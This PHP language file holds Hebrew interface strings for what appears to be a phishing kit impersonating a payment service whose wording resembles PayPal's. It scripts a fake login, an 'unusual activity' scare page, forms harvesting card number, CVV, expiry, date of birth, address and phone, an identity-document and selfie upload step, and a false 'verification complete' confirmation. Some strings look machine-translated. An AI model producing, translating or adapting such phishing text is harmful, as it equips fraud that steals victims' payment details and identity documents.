<?php

	$lg_sign = [
		"title" => "היכנס לחשבון ה שלך",
		"alert" => "Please check your entries and try again.",
		"changer" => "Change",
		"eml_placeholder" => "כתובת אימייל",
		"eml_msg1" => "נדרשת כתובת אימייל.",
		"eml_msg2" => "נראה שכתובת אימייל זו שגויה. בדוק את הפרטים ונסה שוב.",
		"bt_next" => "הבא",
		"pwd_placeholder" => "Enter your password",
		"pwd_show" => "הצג סיסמה",
		"pwd_hide" => "הסתר",
		"bt_login" => "Log In",
		"trouble" => "לא מצליח להיכנס לחשבון שלך?",
		"or" => "או",
		"bt_signup" => "הירשם",
		"footer" => [
			"contact" => "צור קשר",
			"privacy" => "פרטיות",
			"legal" => "הסכמים משפטיים",
			"world" => "הבינלאומי"
		],
		"rotate" => "מעבד ..."
	];

	$lg_activity = [
		"title" => "פעילות חריגה",
		"head" => "שמנו לב כמה פעילות יוצאת דופן",
		"body" => "אנו זקוקים לעזרתך לאבטחת החשבון שלך כדי למנוע גישה לא מורשית. למען בטחונך, עשויות להיות מגבלות על החשבון שלך אם המידע אינו נכון",
		"bt_secure" => "אבטח את החשבון שלי"
	];

	$lg_process = [
		"title" => "החשבון שלי",
		"logout" => "הניתוק",
		"menu" => [
			"home" => "סיכום",
			"activity" => "פעילות",
			"send_receive" => "שלח ובקש",
			"wallet" => "שלח ובקש",
			"help" => "עֶזרָה",
			"open" => "תַפרִיט",
			"close" => "קָרוֹב"
		],
		"head1" => "אשר את הכרטיס שלך",
		"head2" => "אשר את הכתובת שלך",
		"ctype" => "סוג כרטיס",
		"cnumber" => "מספר כרטיס אשראי",
		"exp" => "תפוגה  MM/YY",
		"csc" => "CVV (3 ספרות )",
		"name" => "שם מלא",
		"dob" => "תאריך לידה  (DD/MM/YYYY)",
		"address" => "כתובת",
		"city" => "עיר / כפר",
		"zip" => "מיקוד",
		"ptype" => "סוג טלפון",
		"pnumber" => "מספר טלפון",
		"bt_save" => "שמור",
		"footer" => [
			"security" => "בִּטָחוֹן",
			"rights" => "כל הזכויות שמורות."
		]
	];

	$lg_id = [
		"head" => "העלה את הזהות שלך",
		"proof" => [
			"one" => "הוכחת זהות",
			"two" => "עם הוכחה",
			"three" => "התהליך הושלם"
		],
		"choose" => "בחר את סוג הזיהוי שלך",
		"type" => [
			"one" => "דַרכּוֹן",
			"two" => "תעודת זהות",
			"three" => "רשיון נהיגה"
		],
		"bt_proceed" => "להמשיך",
		"head_up" => "העלה את",
		"rule1" => [
			"one" => "צלם תמונה באיכות גבוהה - <br>או בצע סריקה באיכות גבוהה",
			"two" => "להגיש את שני הצדדים<br> של מסמך דו צדדי",
			"three" => "סרוק את שני הדפים - <br>אם תבחר דרכון"
		],
		"drop_zone" => "<b> גרור ושחרר או לחץ כאן </b>כדי להעלות את התמונה שלך (עד 5 MB)",
		"bt_back" => "תחזור",
		"head_slf" => "טען selfie עם",
		"rule2" => [
			"one" => "ודא שאתה מסתכל ישר אל המצלמה",
			"two" => "אצבעותיך אינן מכסות את התמונה או כל מידע חשוב",
			"three" => "לא ללבוש כובע או משקפיים, <br> ולוודא כי הזקן שלך הוא trimmed"
		]
	];

	$lg_finish = [
		"head" => "תהליך האימות הושלם",
		"on" => "הופעל",
		"p1" => "הגנה על הרכישה היא כעת",
		"p2" => "הוא מכסה את כל הרכישות כשירות שבו החשבון משמש, כמו גם תשלומים שבוצעו באמצעות אתר האינטרנט שלנו. כדי לנצל את ההגנה על רכישה, אנו דורשים, בין היתר, שחשבונות יישמרו במצב תקין ויבקשו שתוגש ערעור תוך 180 יום מיום הרכישה או התשלום שלך.",
		"p3" => "קראו את דרישות הגנת רכישה"
	];

?>